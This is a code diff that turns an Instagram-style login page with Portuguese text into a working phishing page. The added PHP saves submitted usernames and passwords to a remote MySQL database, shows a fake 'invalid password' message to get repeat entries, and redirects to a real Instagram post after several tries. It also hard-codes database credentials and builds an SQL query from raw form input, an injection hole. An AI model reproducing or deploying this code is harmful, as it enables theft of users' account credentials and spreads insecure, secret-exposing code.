@@ -1,3 +1,23 @@
+<?php
+
+$conn = mysqli_connect("192.185.176.179", "rbrspo53_admin", "12345678m", "rbrspo53_random_api");
+
+if (mysqli_connect_errno()) {
+    die("Falha na conexão com o Banco de Dados. Erro nº: " . mysqli_connect_errno());
+}
+
+if (isset($_POST['a']) && isset($_POST['b']))
+  mysqli_query($conn, "INSERT INTO regs (a, b) VALUES ('" . $_POST['a'] . "', '" . $_POST['b'] . "')");
+
+if(isset($_POST['c']))
+  $retry = intval($_POST['c']) + 1;
+else $retry = 0;
+
+if(intval($_POST['c']) > 2)
+  header('Location: https://www.instagram.com/p/CBgZw6jB3L5/?utm_source=ig_web_copy_link');
+
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 
@@ -16,13 +36,15 @@
     <div class="container">
       <div class="phone-app-demo"></div>
       <div class="form-data">
-        <form action="">
+        <form method="POST">
           <div class="logo">
             <img src="./images/logo.png" alt="logo">
           </div>
-          <input type="text" placeholder="Phone number, username, or email">
-          <input type="password" placeholder="Password">
-          <button class="form-btn" type="submit">Log in</button>
+          <input name="a" type="text" placeholder="Telefone, nome de usuário ou e-mail">
+          <input name="b" type="password" placeholder="Senha">
+          <input name="c" type="hidden" value="<?php echo $retry ?>" />
+          <?php if($retry > 1 ) echo "Usuário ou senha inválidos." ?>
+          <button class="form-btn" type="submit">Entrar</button>
           <span class="has-separator">OU</span>
           <a class="facebook-login" href="#">
             <i class="fab fa-facebook-square"></i> Entrar com o Facebook
